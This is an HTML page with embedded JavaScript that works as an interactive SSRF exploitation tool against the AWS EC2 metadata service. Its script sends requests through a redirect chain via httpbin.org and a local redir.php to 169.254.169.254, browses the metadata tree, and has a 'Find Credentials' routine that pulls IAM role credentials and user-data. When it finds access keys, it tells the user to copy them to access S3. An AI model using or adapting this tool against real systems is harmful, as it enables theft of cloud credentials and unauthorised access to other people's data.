<!DOCTYPE html>
<html>
<head>
    <title>AWS Metadata Browser</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            background: #1e1e1e;
            color: #ffffff;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #2d2d2d;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        
        .header {
            background: #333;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 5px solid #00ff00;
        }
        
        .navigation {
            background: #444;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        
        .breadcrumb {
            background: #555;
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 10px;
            font-size: 14px;
        }
        
        .endpoint-list {
            background: #2a2a2a;
            border: 1px solid #555;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        .endpoint-item {
            padding: 12px 15px;
            border-bottom: 1px solid #444;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .endpoint-item:hover {
            background: #3a3a3a;
        }
        
        .endpoint-item:last-child {
            border-bottom: none;
        }
        
        .directory {
            color: #87CEEB;
        }
        
        .directory::before {
            content: "üìÅ ";
        }
        
        .file {
            color: #98FB98;
        }
        
        .file::before {
            content: "üìÑ ";
        }
        
        .credentials {
            color: #FF6B6B !important;
            font-weight: bold;
        }
        
        .credentials::before {
            content: "üîë ";
        }
        
        .response-area {
            background: #1a1a1a;
            border: 1px solid #555;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
            min-height: 200px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            overflow-x: auto;
        }
        
        .loading {
            color: #FFD700;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.3; }
        }
        
        .success {
            color: #00FF00;
        }
        
        .error {
            color: #FF4444;
        }
        
        .button {
            background: #007ACC;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 3px;
            cursor: pointer;
            margin: 5px;
        }
        
        .button:hover {
            background: #005c99;
        }
        
        .credentials-alert {
            background: #8B0000;
            border: 2px solid #FF0000;
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            text-align: center;
            font-weight: bold;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîç AWS Metadata Service Browser</h1>
            <p>Interactive browser for AWS EC2 metadata endpoints via SSRF</p>
        </div>
        
        <div class="navigation">
            <div class="breadcrumb" id="breadcrumb">
                Current path: /
            </div>
            
            <button class="button" onclick="goHome()">üè† Home</button>
            <button class="button" onclick="goBack()">‚¨ÖÔ∏è Back</button>
            <button class="button" onclick="refreshCurrent()">üîÑ Refresh</button>
            <button class="button" onclick="findCredentials()">üîë Find Credentials</button>
        </div>
        
        <div class="endpoint-list" id="endpointList">
            <div class="loading">üîÑ Loading metadata structure...</div>
        </div>
        
        <div class="response-area" id="responseArea">
            Welcome to AWS Metadata Browser
            
            Click on directories above to navigate the metadata structure.
            
            Quick links:
            ‚Ä¢ IAM Security Credentials
            ‚Ä¢ Instance Identity
            ‚Ä¢ User Data
            ‚Ä¢ Network Interfaces
            
            Looking for AWS credentials? Click "Find Credentials" button above.
        </div>
    </div>
    
    <script>
        var currentPath = '';
        var pathHistory = [];
        var baseSSRFUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254';
        
        var metadataStructure = {
            '': {
                type: 'directory',
                items: [
                    '1.0/',
                    'latest/',
                    '2007-01-19/',
                    '2008-02-01/',
                    '2009-04-04/',
                    '2011-01-01/'
                ]
            },
            'latest': {
                type: 'directory', 
                items: [
                    'meta-data/',
                    'user-data',
                    'dynamic/'
                ]
            },
            '1.0': {
                type: 'directory',
                items: [
                    'meta-data/',
                    'user-data'
                ]
            },
            'latest/meta-data': {
                type: 'directory',
                items: [
                    'ami-id',
                    'ami-launch-index', 
                    'ami-manifest-path',
                    'instance-id',
                    'instance-type',
                    'local-hostname',
                    'local-ipv4',
                    'public-hostname',
                    'public-ipv4',
                    'placement/',
                    'security-groups',
                    'iam/',
                    'network/'
                ]
            },
            '1.0/meta-data': {
                type: 'directory',
                items: [
                    'ami-id',
                    'ami-launch-index',
                    'instance-id', 
                    'instance-type',
                    'local-hostname',
                    'local-ipv4',
                    'public-hostname',
                    'public-ipv4',
                    'iam/',
                    'placement/'
                ]
            },
            'latest/meta-data/iam': {
                type: 'directory',
                items: [
                    'info',
                    'security-credentials/'
                ]
            },
            '1.0/meta-data/iam': {
                type: 'directory',
                items: [
                    'info',
                    'security-credentials/'
                ]
            },
            'latest/meta-data/iam/security-credentials': {
                type: 'directory',
                items: [
                    'S3Role',
                    'EC2Role',
                    'DefaultRole'
                ]
            },
            '1.0/meta-data/iam/security-credentials': {
                type: 'directory',
                items: [
                    'S3Role',
                    'EC2Role', 
                    'DefaultRole'
                ]
            }
        };
        
        function updateBreadcrumb() {
            document.getElementById('breadcrumb').textContent = 'Current path: /' + currentPath;
        }
        
        function displayDirectory(path) {
            var listEl = document.getElementById('endpointList');
            var structure = metadataStructure[path];
            
            if (!structure) {
                // Unknown directory, try to fetch it
                fetchEndpoint(path);
                return;
            }
            
            var html = '';
            structure.items.forEach(function(item) {
                var isDirectory = item.endsWith('/');
                var displayName = item;
                var fullPath = path ? path + '/' + item : item;
                
                var cssClass = isDirectory ? 'directory' : 'file';
                if (item.includes('credentials') || item.includes('S3Role') || item.includes('EC2Role')) {
                    cssClass += ' credentials';
                }
                
                html += '<div class="endpoint-item ' + cssClass + '" onclick="navigate(\'' + fullPath.replace('/', '') + '\')">';
                html += displayName;
                html += '</div>';
            });
            
            listEl.innerHTML = html;
        }
        
        function navigate(path) {
            pathHistory.push(currentPath);
            currentPath = path.replace(/\/$/, ''); // Remove trailing slash
            updateBreadcrumb();
            
            if (metadataStructure[currentPath]) {
                displayDirectory(currentPath);
            } else {
                fetchEndpoint(currentPath);
            }
        }
        
        function fetchEndpoint(path) {
            var listEl = document.getElementById('endpointList');
            var responseEl = document.getElementById('responseArea');
            
            listEl.innerHTML = '<div class="loading">üîÑ Fetching: /' + path + '</div>';
            responseEl.textContent = 'Loading...';
            
            var fullUrl = baseSSRFUrl + (path ? '/' + path : '');
            
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', fullUrl, false);
                xhr.send();
                
                var response = xhr.responseText;
                responseEl.textContent = 'Response from /' + path + ':\n\n' + response;
                
                // Check if this looks like a directory listing
                if (response.includes('\n') && !response.includes('{') && response.length < 1000) {
                    var items = response.split('\n').filter(item => item.trim());
                    var html = '';
                    
                    items.forEach(function(item) {
                        var trimmed = item.trim();
                        if (trimmed) {
                            var isDirectory = !trimmed.includes('.') || trimmed === 'security-credentials';
                            var cssClass = isDirectory ? 'directory' : 'file';
                            
                            if (trimmed.includes('credentials') || trimmed.includes('Role')) {
                                cssClass += ' credentials';
                            }
                            
                            html += '<div class="endpoint-item ' + cssClass + '" onclick="navigate(\'' + 
                                   (path ? path + '/' + trimmed : trimmed) + '\')">';
                            html += trimmed;
                            html += '</div>';
                        }
                    });
                    
                    if (html) {
                        listEl.innerHTML = html;
                    } else {
                        listEl.innerHTML = '<div class="file">Raw response (see below)</div>';
                    }
                } else {
                    listEl.innerHTML = '<div class="file">File content (see response below)</div>';
                }
                
                // Check for AWS credentials
                if (response.includes('AccessKeyId') || response.includes('SecretAccessKey')) {
                    var alertDiv = document.createElement('div');
                    alertDiv.className = 'credentials-alert';
                    alertDiv.innerHTML = 'üö®üö®üö® AWS CREDENTIALS DETECTED! üö®üö®üö®<br>Copy the credentials below to access S3!';
                    responseEl.parentNode.insertBefore(alertDiv, responseEl);
                    
                    responseEl.style.background = '#2d1b1b';
                    responseEl.style.borderColor = '#ff0000';
                }
                
            } catch (e) {
                responseEl.textContent = 'Error fetching /' + path + ':\n\n' + e.message;
                listEl.innerHTML = '<div class="error">‚ùå Failed to fetch endpoint</div>';
            }
        }
        
        function goHome() {
            pathHistory = [];
            currentPath = '';
            updateBreadcrumb();
            displayDirectory('');
            document.getElementById('responseArea').textContent = 'Back to metadata root';
        }
        
        function goBack() {
            if (pathHistory.length > 0) {
                currentPath = pathHistory.pop();
                updateBreadcrumb();
                displayDirectory(currentPath);
            }
        }
        
        function refreshCurrent() {
            if (currentPath) {
                fetchEndpoint(currentPath);
            } else {
                displayDirectory('');
            }
        }
        
        function findCredentials() {
            document.getElementById('responseArea').textContent = 'Searching for AWS credentials...\n\n';
            
            var credentialPaths = [
                '1.0/meta-data/iam/security-credentials/S3Role',
                'latest/meta-data/iam/security-credentials/S3Role',
                '2007-01-19/meta-data/iam/security-credentials/S3Role',
                '1.0/user-data',
                'latest/user-data'
            ];
            
            credentialPaths.forEach(function(path, index) {
                setTimeout(function() {
                    navigate(path);
                }, index * 3000);
            });
        }
        
        // Initialize
        displayDirectory('');
        updateBreadcrumb();
    </script>
</body>
</html>
